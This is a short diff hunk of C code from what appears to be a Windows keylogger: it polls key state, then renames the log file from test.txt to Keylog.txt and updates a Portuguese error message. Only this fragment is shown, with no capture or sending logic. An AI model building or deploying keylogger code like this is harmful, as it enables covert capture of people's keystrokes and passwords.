@@ -19,10 +19,10 @@ int main() {
             if(keyState == -32767) {
                 Sleep(30);
                 FILE *file;
-                file = fopen("test.txt", "a+");
+                file = fopen("Keylog.txt", "a+");
  
                 if(file == NULL) {
-                    printf("Erro ao criar o Arquivo test.txt.\n");
+                    printf("Erro ao criar o Arquivo Keylog.txt.\n");
                     exit(1);
                 }
  
